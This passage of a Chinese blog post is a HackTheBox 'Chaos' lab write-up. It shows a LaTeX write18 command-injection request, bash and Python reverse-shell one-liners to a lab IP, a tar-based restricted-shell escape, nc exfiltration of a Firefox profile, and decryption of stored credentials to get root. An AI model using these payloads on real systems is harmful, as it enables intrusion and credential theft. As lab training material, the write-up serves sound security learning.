class="line">(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrlfile.sty)))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/tocbasic.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/scrsize11pt.clo)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/koma-script/typearea.sty))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/jknapltx/sans.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/t1cmss.fd))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/switch.def)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel-english/english.ldf</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/babel.def</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/generic/babel/txtbabel.def))))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsmath.sty</span><br><span class="line">For additional information on amsmath, use the `?&#x27; option.</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amstext.sty</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsgen.sty))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsbsy.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsmath/amsopn.sty))</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/amsfonts.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amscls/amsthm.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/lipsum/lipsum.sty)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/sectsty/sectsty.sty)</span><br><span class="line"></span><br><span class="line">Class scrartcl Warning: Usage of package `fancyhdr&#x27; together</span><br><span class="line">(scrartcl)              with a KOMA-Script class is not recommended.</span><br><span class="line">(scrartcl)              I&#x27;d suggest to use </span><br><span class="line">(scrartcl)              package `scrlayer&#x27; or `scrlayer-scrpage&#x27;, because</span><br><span class="line">(scrartcl)              they support KOMA-Script classes.</span><br><span class="line">(scrartcl)              With `fancyhdr&#x27; several features of class `scrartcl&#x27;</span><br><span class="line">(scrartcl)              like options `headsepline&#x27;, `footsepline&#x27; or command</span><br><span class="line">(scrartcl)              `\MakeMarkcase&#x27; and the commands `\setkomafont&#x27; and</span><br><span class="line">(scrartcl)              `\addtokomafont&#x27; for the page style elements need</span><br><span class="line">(scrartcl)              explicite user intervention to work.</span><br><span class="line">(scrartcl)              Nevertheless, using requested</span><br><span class="line">(scrartcl)              package `fancyhdr&#x27; on input line 34.</span><br><span class="line"></span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/fancyhdr/fancyhdr.sty)</span><br><span class="line">No file 5e12799f4d92286db03fa23075cac69e.aux.</span><br><span class="line"></span><br><span class="line">LaTeX Font Warning: Font shape `T1/cmss/m/sc&#x27; in size &lt;10.95&gt; not available</span><br><span class="line">(Font)              Font shape `T1/cmr/m/sc&#x27; tried instead on input line 69.</span><br><span class="line"></span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd)</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd) [1&#123;/var/lib/texmf/fo</span><br><span class="line">nts/map/pdftex/updmap/pdftex.map&#125;] (./5e12799f4d92286db03fa23075cac69e.aux) )</span><br><span class="line">!pdfTeX error: /usr/bin/pdflatex (file ecss1095): Font ecss1095 at 600 not foun</span><br><span class="line">d</span><br><span class="line"> ==&gt; Fatal error occurred, no output PDF file produced!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过响应包分析后，我又在<code>Google</code>上找到了一种叫做 <code>LaTeX</code> 编辑器的攻击手段，具体可以看看这篇文章：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0day.work/hacking-with-latex/</span><br></pre></td></tr></table></figure>
+
+<p>我们通过命令依赖于 <code>write18</code> 命令，来一波命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php HTTP/1.1</span><br><span class="line">Host: chaos.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 78</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content=liuwx</span><br><span class="line"></span><br><span class="line">\immediate\write18&#123;whoami&#125;&amp;template=test1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/744.png" alt="图片"></p>
+<p>发现只是一个 <code>www-data</code> 普通权限，那么我们先通过 <code>nc</code> 来反弹一个 <code>shell</code> 回来：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/745.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.128/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/746.png" alt="图片"></p>
+<p>额，发现没什么用，那么我们换个思路，利用 <code>Python</code> 来得到<code>shell</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.128&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/747.png" alt="图片"></p>
+<p>这个时候得到一枚 <code>shell</code> ，虽然得到了 <code>shell</code> 但是它不是用 <code>/bin/bash</code> ，那么我们就通过 <code>python</code> 来得到 <code>bash</code> 吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/748.png" alt="图片"></p>
+<p>来到 <code>home</code> 目录下，发现有三个用户：<code>ayush</code>、<code>jack</code>、<code>sahay</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ayush</span><br><span class="line">jack</span><br><span class="line">sahay jiujitsu</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/749.png" alt="图片"></p>
+<p><code>ayush</code>？是不是很熟悉？之前在<code>wordpress</code>文章里有一个<code>ayush</code>的账号，密码是<code>jiujitsu</code>，然后我们<code>su</code> 切换一下用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su ayush</span><br><span class="line"></span><br><span class="line">user：ayush</span><br><span class="line">pass：jiujitsu</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/750.png" alt="图片"></p>
+<h2 id="Linux受限Shell绕过"><a href="#Linux受限Shell绕过" class="headerlink" title="Linux受限Shell绕过"></a>Linux受限Shell绕过</h2><p>这个时候就得到了一个 <code>rbash</code> 的 <code>shell</code>，但是我发现它执行不了一些命令，例如 <code>ls</code> ：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/751.png" alt="图片"></p>
+<p>但是通过 <code>FUZZ</code> 发现可以使用 <code>dir</code> 命令：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/752.png" alt="图片"></p>
+<p>但是还是没有什么用，使用不了 <code>cd</code> 命令以及一些常用命令：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/753.png" alt="图片"></p>
+<p>通过查看<code>环境变量</code>发现它的环境变量被设置到了 <code>/home/ayush/.app</code> 里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ayush@chaos:/var/www$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/home/ayush/.app</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/754.png" alt="图片"></p>
+<p>随后我便我在 <code>exploit-db</code> 上找到了一个Linux受限Shell绕过的文章：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a></p>
+</blockquote>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/755.png" alt="图片"></p>
+<p>其中 <code>POC</code> 是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后我们重新设置一下 <code>PATH</code> 的路径：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin:/usr/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/756.png" alt="图片"></p>
+<p>这个时候就可以执行 <code>ls</code> 命令了！接着来到 <code>/home/ayush</code> 目录下，发现一个 <code>user.txt</code> ，然后查看得到一个 <code>falg</code>！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/757.png" alt="图片"></p>
+<h2 id="获取Firefox的root用户凭证"><a href="#获取Firefox的root用户凭证" class="headerlink" title="获取Firefox的root用户凭证"></a>获取Firefox的root用户凭证</h2><p>还差一个 <code>root.txt</code>，通过在 <code>ayush</code> 用户目录下，我发现了一个隐藏目录 <code>mozilla</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/758.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/759.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/760.png" alt="图片"></p>
+<p>通过一步步的 <code>cd</code> 切换目录，最终我来到了 <code>bzo7sjt1.default</code> 这个目录，起初我还以为是一个文件，最后才发现这是一个目录！通过 <code>ls</code> 发现里面有一个登陆的 json 文件，<code>logins.json</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/761.png" alt="图片"></p>
+<p>接着我吧 <code>json</code> 格式化了一下，不然看上去有点打脑壳….</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.json.cn/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;nextId&quot;</span>:<span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;logins&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;id&quot;</span>:<span class="number">2</span>,</span><br><span class="line">            <span class="attr">&quot;hostname&quot;</span>:<span class="string">&quot;https://chaos.htb:10000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;httpRealm&quot;</span>:<span class="literal">null</span>,</span><br><span class="line">            <span class="attr">&quot;formSubmitURL&quot;</span>:<span class="string">&quot;https://chaos.htb:10000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;usernameField&quot;</span>:<span class="string">&quot;user&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;passwordField&quot;</span>:<span class="string">&quot;pass&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;encryptedUsername&quot;</span>:<span class="string">&quot;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;encryptedPassword&quot;</span>:<span class="string">&quot;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;guid&quot;</span>:<span class="string">&quot;&#123;cb6cd202-0ff8-4de5-85df-e0b8a0f18778&#125;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;encType&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;timeCreated&quot;</span>:<span class="number">1540642202692</span>,</span><br><span class="line">            <span class="attr">&quot;timeLastUsed&quot;</span>:<span class="number">1540642202692</span>,</span><br><span class="line">            <span class="attr">&quot;timePasswordChanged&quot;</span>:<span class="number">1540642202692</span>,</span><br><span class="line">            <span class="attr">&quot;timesUsed&quot;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;disabledHosts&quot;</span>:[</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>:<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在渗透测试过程中，如果发现目标机器中有浏览器，那么浏览器密码和历史记录是一个突破的地方！如果对方的浏览器是<code>Firefox</code>，那么则需要<code>logins.json</code>文件，还有一个<code>key3.db</code>（这个是低版本的Firefox），当前机器中的是<code>key4.db</code>，说明它的<code>Firefox</code>版本还比较高！那么我们还需要一个高版本的<code>cert9.db</code>（这是高版本，低版本是cert8.db）</p>
+<p>为了方便，我直接把 <code>.mozilla</code> 目录压缩打包吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf fox.tar.gz .mozilla</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/762.png" alt="图片"></p>
+<p>然后通过 <code>nc</code> 我们把文件传输到 <code>KALI</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 在KALI 上运行，接收到的文件重定向到fox.tar.gz</span><br><span class="line">nc -nlvp 6666 &gt; fox.tar.gz </span><br><span class="line"> # 在目标主机上运行 nc 传输 fox.tar.gz 文件到 kali</span><br><span class="line">nc -nv 10.10.10.128 6666 &lt; fox.tar.gz </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/763.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/764.png" alt="图片"></p>
+<p>最后我们在 <code>Github</code> 上找到有一个脚本可以解出<code>firefox</code>的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/unode/firefox_decrypt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/765.png" alt="图片"></p>
+<p>我们先把刚刚的 <code>fox</code> 解压到当前目录下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf fox.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/766.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/767.png" alt="图片"></p>
+<p>Copy 成功后，我们就可以运行脚本了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python firefox_decrypt.py ~/.mozilla/firefox/bzo7sjt1.default</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/768.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Master Password for profile /root/.mozilla/firefox/bzo7sjt1.default: </span><br><span class="line"></span><br><span class="line">Website:   https://chaos.htb:10000</span><br><span class="line">Username: &#x27;root&#x27;</span><br><span class="line">Password: &#x27;Thiv8wrej~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这个时候得到了 <code>root</code> 账号和密码：<code>Thiv8wrej~</code>，我们切换一下账号：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">password：Thiv8wrej~</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/769.png" alt="图片"></p>
+<p>最终来到 <code>/root</code> 目录下，查看 <code>root.txt</code> 得到 <code>flag</code> ！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@chaos:~<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">4eca7e09e3520e020884563cfbabbc70</span><br></pre></td></tr></table></figure>
+
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>这次呢，先是通过信息搜集发现了一个<code>wordpress</code>的页面，页面中有一篇文章是有密码的。</p>
+<p>通过社工的手段和<code>BurpSuite</code>得到了文章密码，进入文章页面后发现里面泄露了一个邮箱的账号和密码，之后登陆邮箱发现里面有两个附件，通过解密出来附件中的内容得到一个web页面。而这个Web页面是一个创建<code>PDF</code>的编辑器叫做： <code>LaTeX</code>编辑器，我通过<code>Pdflatex</code>手段我们利用<code>nc</code>的<code>python</code>代码得到了一枚<code>shell</code>。</p>
+<p>然后通过<code>Linux</code>受限我们绕过了不能执行<code>shell</code>命令的限制，后来又发现<code>ayush</code>用户安装了<code>火狐浏览器</code>（Firefox），最终是通过<code>python</code>脚本解出了<code>Firefox</code>的用户凭证得到了<code>root</code>密码，拿到<code>Flag</code>！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/09/HackTheBox-Chaos/">http://example.com/2019/12/09/HackTheBox-Chaos/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/HackTheBox/"># HackTheBox</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/16/CTF-Born2Root/">CTF-Born2root's-WriteUP，通过定时任务反弹shell再到Hadry暴力枚举SSH拿到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/02/djinn-1/">VulnHub通关日记-djinn-1_一次Fuzz渗透测试拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
